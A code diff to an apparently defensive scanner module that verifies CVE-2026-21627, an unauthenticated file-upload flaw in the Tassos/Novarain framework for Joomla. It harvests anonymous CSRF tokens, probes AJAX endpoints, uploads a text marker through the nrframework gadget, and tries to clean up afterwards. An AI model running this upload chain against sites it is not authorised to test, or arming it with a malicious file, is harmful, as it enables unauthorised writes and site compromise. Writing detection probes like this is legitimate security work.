@@ -7,9 +7,9 @@ import secrets
 import urllib.parse
 from typing import Any
 
-from ...core.http import HttpClient, normalize_url
+from ...core.http import HttpClient, build_multipart, normalize_url
 from ...core.models import Finding
-from ...core.probes import find_anon_csrf_token
+from ...core.probes import extract_csrf_from_html
 from ...core.versions import parse_version_safe
 
 CVE_ID = "CVE-2026-21627"
@@ -19,7 +19,6 @@ AFFECTED_RULE = "Tassos Framework 4.10.14-6.0.37 and affected bundled product re
 HAS_EXPLOIT = True
 INTRUSIVE = False
 EXPLOIT_MODES = ["safe"]
-AJAX_PATH = "/index.php"
 
 PRODUCTS: dict[str, tuple[str, str | None, str | None]] = {
     "nrframework": ("Novarain/Tassos Framework", "4.10.14", "6.0.37"),
@@ -59,41 +58,140 @@ def _finding(status: str, confidence: str, detail: str, **kwargs: Any) -> Findin
 
 
 def _stored_filename(response: dict[str, Any]) -> tuple[str | None, str | None]:
-    server_path = response.get("file") if isinstance(response.get("file"), str) else None
+    raw_path = response.get("file") if isinstance(response.get("file"), str) else None
+    server_path = _decode_response_value(raw_path)
     if server_path:
         filename = server_path.replace("\\", "/").rsplit("/", 1)[-1]
         if re.fullmatch(r"[A-Za-z0-9._-]+", filename):
             return filename, server_path
-    encoded = response.get("file_name")
-    if isinstance(encoded, str):
-        try:
-            filename = base64.b64decode(encoded, validate=True).decode("utf-8")
-        except (ValueError, UnicodeDecodeError):
-            filename = encoded
+    encoded = response.get("file_name") if isinstance(response.get("file_name"), str) else None
+    if encoded:
+        filename = _decode_response_value(encoded) or encoded
         if re.fullmatch(r"[A-Za-z0-9._-]+", filename):
             return filename, server_path
     return None, server_path
 
 
+def _decode_response_value(value: str | None) -> str | None:
+    if not value:
+        return None
+    try:
+        decoded = base64.b64decode(value, validate=True).decode("utf-8")
+        return decoded if decoded else value
+    except (ValueError, UnicodeDecodeError):
+        return value
+
+
+def _ajax_candidates(base: str, homepage_url: str) -> list[str]:
+    parsed = urllib.parse.urlsplit(homepage_url)
+    path = parsed.path or "/"
+    prefix = path if path.endswith("/") else path.rsplit("/", 1)[0] + "/"
+    if prefix.endswith("/administrator/"):
+        prefix = prefix[: -len("administrator/")]
+    candidates = [
+        f"{base}{prefix.rstrip('/')}/component/ajax/",
+        f"{base}/component/ajax/",
+        f"{base}/index.php",
+    ]
+    return list(dict.fromkeys(candidates))
+
+
+def _invalid_token(body: str) -> bool:
+    lowered = body.lower()
+    return (
+        "jinvalid_token" in lowered
+        or "invalid token" in lowered
+        or "token de segurança inválido" in lowered
+        or "token de seguranca invalido" in lowered
+    )
+
+
+def _query_url(endpoint: str, params: dict[str, str]) -> str:
+    if endpoint.endswith("index.php"):
+        params = {"option": "com_ajax", **params}
+    return f"{endpoint}?{urllib.parse.urlencode(params)}"
+
+
+def _csrf_candidates(
+    client: HttpClient,
+    base: str,
+    homepage_url: str,
+    timeout: int,
+) -> list[tuple[str, str]]:
+    urls = [
+        homepage_url,
+        f"{base}/administrator/",
+        f"{base}/administrator/index.php",
+        f"{base}/index.php?option=com_users&view=login",
+    ]
+    tokens: list[tuple[str, str]] = []
+    seen: set[str] = set()
+    for url in dict.fromkeys(urls):
+        response = client.request(url, timeout=timeout)
+        candidate = extract_csrf_from_html(response.get("body", ""))
+        if candidate and candidate not in seen:
+            seen.add(candidate)
+            tokens.append((candidate, url))
+    return tokens
+
+
 def run_safe_probe(target_url: str, timeout: int = 12, proxy: str | None = None) -> Finding:
     base = normalize_url(target_url)
     client = HttpClient(timeout=timeout, proxy=proxy)
-    client.request(f"{base}/", timeout=timeout)
-    client.request(
-        f"{base}{AJAX_PATH}?option=com_ajax&format=raw&plugin=nrframework",
-        timeout=timeout,
-    )
-    token, _token_source = find_anon_csrf_token(
-        base,
-        timeout=timeout,
-        proxy=proxy,
-        requester=client.request,
-    )
-    if not token:
+    initial = client.request(f"{base}/", timeout=timeout)
+    homepage_url = initial.get("final_url") or f"{base}/"
+    endpoint = None
+    token = None
+    token_source = None
+    preflight_detail = "no AJAX candidate accepted a session-bound token"
+    for candidate in _ajax_candidates(base, homepage_url):
+        trigger_url = _query_url(candidate, {"format": "raw", "plugin": "nrframework"})
+        client.request(trigger_url, timeout=timeout)
+        token_candidates = _csrf_candidates(client, base, homepage_url, timeout)
+        if not token_candidates:
+            preflight_detail = "the refreshed public and administrator pages exposed no anonymous CSRF token"
+            continue
+        for candidate_token, candidate_source in token_candidates:
+            verify_params = {
+                "format": "raw",
+                "plugin": "nrframework",
+                "task": "include",
+                "path": "plugins/system/nrframework/fields/",
+                "file": "nrinlinefileupload",
+                "class": "JFormFieldNRInlineFileUpload",
+                candidate_token: "1",
+            }
+            verify = client.request(
+                _query_url(candidate, verify_params),
+                timeout=timeout,
+                follow_redirects=False,
+            )
+            if verify.get("status") in {301, 302, 303, 307, 308}:
+                preflight_detail = "the candidate redirected instead of handling the token directly"
+                break
+            verify_body = verify.get("body", "")
+            if _invalid_token(verify_body):
+                preflight_detail = "Joomla rejected all extracted session-bound CSRF tokens"
+                continue
+            if verify.get("status") != 200 or not re.search(
+                r"error|response|upload|FILE_ERROR|CLASS_ERROR|METHOD_ERROR",
+                verify_body,
+                re.IGNORECASE,
+            ):
+                preflight_detail = "the candidate did not return an nrframework gadget response"
+                continue
+            endpoint = candidate
+            token = candidate_token
+            token_source = candidate_source
+            break
+        if endpoint:
+            break
+
+    if not token or not endpoint:
         return _finding(
             "NOT_CONFIRMED",
             "LOW",
-            "The session was initialized, but no matching anonymous Joomla CSRF token was found.",
+            f"The session/CSRF preflight failed: {preflight_detail}.",
             exploit_ran=True,
         )
 
@@ -101,7 +199,6 @@ def run_safe_probe(target_url: str, timeout: int = 12, proxy: str | None = None)
     marker = f"ProofCMS CVE-2026-21627 safe proof {nonce}"
     original_name = f"proofcms-{nonce}.txt"
     params = {
-        "option": "com_ajax",
         "format": "raw",
         "plugin": "nrframework",
         "task": "include",
@@ -111,24 +208,34 @@ def run_safe_probe(target_url: str, timeout: int = 12, proxy: str | None = None)
         "upload_folder": base64.b64encode(b"images").decode(),
         token: "1",
     }
-    upload_url = f"{base}{AJAX_PATH}?{urllib.parse.urlencode(params)}"
-    upload = client.post_multipart(
+    upload_url = _query_url(endpoint, params)
+    content_type, upload_body = build_multipart(
+        {},
+        {"file": (original_name, marker.encode(), "text/plain")},
+    )
+    upload = client.request(
         upload_url,
-        fields={},
-        files={"file": (original_name, marker.encode(), "text/plain")},
+        method="POST",
+        headers={"Content-Type": content_type},
+        data=upload_body,
         timeout=timeout,
+        follow_redirects=False,
     )
     try:
         upload_json = json.loads(upload.get("body", ""))
     except (json.JSONDecodeError, TypeError):
         upload_json = {}
     if not isinstance(upload_json, dict) or upload_json.get("error") is not False:
+        response_excerpt = re.sub(r"\s+", " ", upload.get("body", "")).strip()[:240]
         return _finding(
             "NOT_CONFIRMED",
             "MEDIUM",
-            f"The safe text upload was not accepted (HTTP {upload.get('status', 0)}).",
+            (
+                f"The safe text upload was not accepted (HTTP {upload.get('status', 0)}). "
+                f"Response: {response_excerpt or 'empty'}"
+            ),
             exploit_ran=True,
-            proof_url=upload_url,
+            proof_url=endpoint,
         )
 
     filename, server_path = _stored_filename(upload_json)
@@ -158,7 +265,7 @@ def run_safe_probe(target_url: str, timeout: int = 12, proxy: str | None = None)
         cleanup_params = dict(params)
         cleanup_params.pop("upload_folder", None)
         cleanup_params.update({"action": "remove", "remove_file": server_path})
-        cleanup_url = f"{base}{AJAX_PATH}?{urllib.parse.urlencode(cleanup_params)}"
+        cleanup_url = _query_url(endpoint, cleanup_params)
         cleanup = client.request(cleanup_url, timeout=timeout)
         cleanup_check = client.request(proof_url, timeout=timeout)
         cleaned = cleanup.get("status") == 200 and (
@@ -171,7 +278,7 @@ def run_safe_probe(target_url: str, timeout: int = 12, proxy: str | None = None)
         "CONFIRMED",
         (
             "A unique text marker was written through the unauthenticated nrframework gadget, fetched from /images/, "
-            "and removed using only its returned path."
+            f"and removed using only its returned path. Token source: {token_source}."
             if cleaned
             else "A unique text marker was written through the unauthenticated nrframework gadget and fetched from /images/, but cleanup could not be verified."
         ),
